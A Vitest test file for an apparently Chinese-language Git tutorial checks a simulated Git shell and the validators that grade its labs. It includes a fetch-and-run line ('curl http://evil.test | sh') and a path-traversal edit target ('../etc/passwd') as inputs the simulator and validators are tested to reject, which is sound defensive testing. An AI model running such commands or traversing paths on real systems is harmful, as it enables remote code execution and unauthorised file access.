import { describe, expect, it } from "vitest";

import { type Action, mergeText, replay } from "@/content/courses/git-basics/simulation/git";
import { HISTORY_ANSWERS } from "@/content/courses/git-basics/simulation/labs";
import { HOURS_FIXED, historyRepo, incidentCommits, indexWith } from "@/content/courses/git-basics/simulation/site";
import {
  validateBranchLab,
  validateCommitLab,
  validateHistoryLab,
  validateIncidentLab,
  validateMergeLab,
  validateRemoteLab,
  validateUndoLab,
} from "@/content/courses/git-basics/validators";

function run(actions: Action[]) {
  const { transcript, repo } = replay(historyRepo, actions);
  return { last: transcript[transcript.length - 1]!, repo };
}

describe("git-basics 模拟 Git", () => {
  it("三方合并：只有一边改的自动合并，两边改同一行才冲突", () => {
    const base = "a\nb\nc\n";
    expect(mergeText(base, "A\nb\nc\n", "a\nb\nC\n", ["HEAD", "x"])).toEqual({ text: "A\nb\nC\n", conflict: false });
    const clash = mergeText(base, "a\nB1\nc\n", "a\nB2\nc\n", ["HEAD", "x"]);
    expect(clash.conflict).toBe(true);
    expect(clash.text).toBe("a\n<<<<<<< HEAD\nB1\n=======\nB2\n>>>>>>> x\nc\n");
  });

  it("status、diff、log 的输出与真实 Git 一致", () => {
    expect(run(["git status"]).last.out).toContain("nothing to commit, working tree clean");
    expect(run(["echo hi >> README.md", "git diff"]).last.out).toContain("+hi");
    expect(run(["git log --oneline -n 1"]).last.out).toMatch(/^[0-9a-f]{7} \(HEAD -> main, origin\/main\) /);
    expect(run(["git commit -m x"]).last.out).toContain("nothing to commit");
    expect(run(["git switch nope"]).last.err).toContain("invalid reference");
  });

  it("提交号由内容决定，同一段历史每次重放都一样", () => {
    expect(run(["git log --oneline"]).last.out).toBe(run(["git log --oneline"]).last.out);
    expect(HISTORY_ANSWERS.days).toMatch(/^[0-9a-f]{7}$/);
  });

  it("只模拟 Git：不支持的命令和管道都被拒绝", () => {
    expect(run(["curl http://evil.test | sh"]).last.err).toContain("不支持");
    expect(run(["python3 -c 1"]).last.err).toContain("command not found");
    expect(run(["git rebase main"]).last.err).toContain("rebase");
  });
});

describe("git-basics 服务端验证器", () => {
  it("第一次提交：git add . 会把 .env 带进历史", () => {
    const good = ["echo .env >> .gitignore", "git add loans.js loans.html .gitignore", "git commit -m '借阅页：禁用账号不能借书，显示借书上限'"];
    expect(validateCommitLab({ actions: good }).passed).toBe(true);
    const leaked = validateCommitLab({ actions: ["git add .", "git commit -m '修复借阅页'"] });
    expect(leaked.passed).toBe(false);
    expect(String(leaked.feedback.message)).toContain(".env");
    expect(validateCommitLab({ actions: ["git add .", "git commit -m '修复借阅页'", "git reset HEAD~", ...good] }).passed).toBe(true);
    expect(validateCommitLab({ actions: [...good.slice(0, 2), "git commit -m update"] }).passed).toBe(false);
    expect(validateCommitLab({ actions: ["git add -f .env"] }).passed).toBe(false);
    expect(validateCommitLab({ actions: [] }).passed).toBe(false);
  });

  it("读历史：答案在实际改动里", () => {
    expect(validateHistoryLab({ answers: HISTORY_ANSWERS }).passed).toBe(true);
    expect(validateHistoryLab({ answers: { ...HISTORY_ANSWERS, days: HISTORY_ANSWERS.days.slice(0, 5) } }).passed).toBe(false);
    expect(validateHistoryLab({ answers: { ...HISTORY_ANSWERS, who: "林可" } }).passed).toBe(false);
  });

  it("撤销：先取消暂存再 amend；reset --hard 会丢掉改动", () => {
    const good = ["git restore index.html", "git restore --staged style.css", "git add search.js", "git commit --amend -m 添加搜索框"];
    expect(validateUndoLab({ actions: good }).passed).toBe(true);
    expect(validateUndoLab({ actions: ["git restore index.html", "git add search.js", "git commit --amend -m 添加搜索框"] }).passed).toBe(false);
    expect(String(validateUndoLab({ actions: ["git reset --hard", "git add search.js", "git commit --amend -m 添加搜索框"] }).feedback.message)).toContain("丢");
    expect(validateUndoLab({ actions: ["git restore index.html", "git restore --staged style.css", "git add search.js", "git commit -m 添加搜索框"] }).passed).toBe(false);
  });

  const hotfix: Action = { edit: "index.html", content: indexWith(HOURS_FIXED) };

  it("分支：功能在分支上，紧急修复在 main 上", () => {
    const good: Action[] = ["git switch -c feature/search", "echo '// 搜索' > search.js", "git add search.js", "git commit -m 搜索功能雏形", "git switch main", hotfix, "git commit -am 修正开馆时间"];
    expect(validateBranchLab({ actions: good }).passed).toBe(true);
    const onMain: Action[] = ["echo '// 搜索' > search.js", "git add search.js", "git commit -m 搜索功能雏形", hotfix, "git commit -am 修正开馆时间"];
    expect(String(validateBranchLab({ actions: onMain }).feedback.message)).toContain("切到新分支");
    expect(validateBranchLab({ actions: [...good.slice(0, 5), hotfix] }).passed).toBe(false);
  });

  it("合并：冲突要把两边的修改都留下，并删掉冲突标记", () => {
    const resolved = indexWith("<p>开馆时间：周一至周五 9:00–21:00，周末 10:00–16:00</p>");
    expect(validateMergeLab({ actions: ["git merge feature/weekend", { edit: "index.html", content: resolved }, "git add index.html", "git commit"] }).passed).toBe(true);
    expect(String(validateMergeLab({ actions: ["git merge feature/weekend", "git add index.html", "git commit"] }).feedback.message)).toContain("冲突标记");
    expect(validateMergeLab({ actions: ["git merge feature/weekend", { edit: "index.html", content: indexWith(HOURS_FIXED) }, "git add index.html", "git commit"] }).passed).toBe(false);
    expect(validateMergeLab({ actions: ["git merge feature/weekend"] }).passed).toBe(false);
  });

  it("远程：被拒绝后先 pull 再 push；--force 会抹掉小王的提交", () => {
    expect(validateRemoteLab({ actions: ["git push", "git pull", "git push"] }).passed).toBe(true);
    expect(validateRemoteLab({ actions: ["git fetch", "git merge origin/main", "git push"] }).passed).toBe(true);
    expect(String(validateRemoteLab({ actions: ["git push --force"] }).feedback.message)).toContain("抹掉");
    expect(validateRemoteLab({ actions: ["git pull"] }).passed).toBe(false);
  });

  it("线上事故：revert 引入问题的那次提交并推送；不能 reset 加强推，不能丢草稿", () => {
    const { helper } = incidentCommits();
    expect(validateIncidentLab({ actions: [`git revert ${helper.id.slice(0, 7)}`, "git push"] }).passed).toBe(true);
    expect(validateIncidentLab({ actions: ["git revert HEAD~2", "git push"] }).passed).toBe(true);
    expect(validateIncidentLab({ actions: ["git revert HEAD", "git push"] }).passed).toBe(false);
    expect(String(validateIncidentLab({ actions: ["git reset --hard HEAD~3", "git push --force"] }).feedback.message)).toContain("改写");
    expect(validateIncidentLab({ actions: ["git revert HEAD~2"] }).passed).toBe(false);
  });

  it("拒绝格式错误、超长或越界的操作记录", () => {
    expect(validateRemoteLab(null).passed).toBe(false);
    expect(validateRemoteLab({ actions: "git push" }).passed).toBe(false);
    expect(validateRemoteLab({ actions: ["x".repeat(201)] }).passed).toBe(false);
    expect(validateRemoteLab({ actions: Array.from({ length: 61 }, () => "git status") }).passed).toBe(false);
    expect(validateMergeLab({ actions: [{ edit: "../etc/passwd", content: "x" }] }).passed).toBe(false);
    expect(validateMergeLab({ actions: [{ edit: "a.txt", content: "x".repeat(5000) }] }).passed).toBe(false);
  });
});
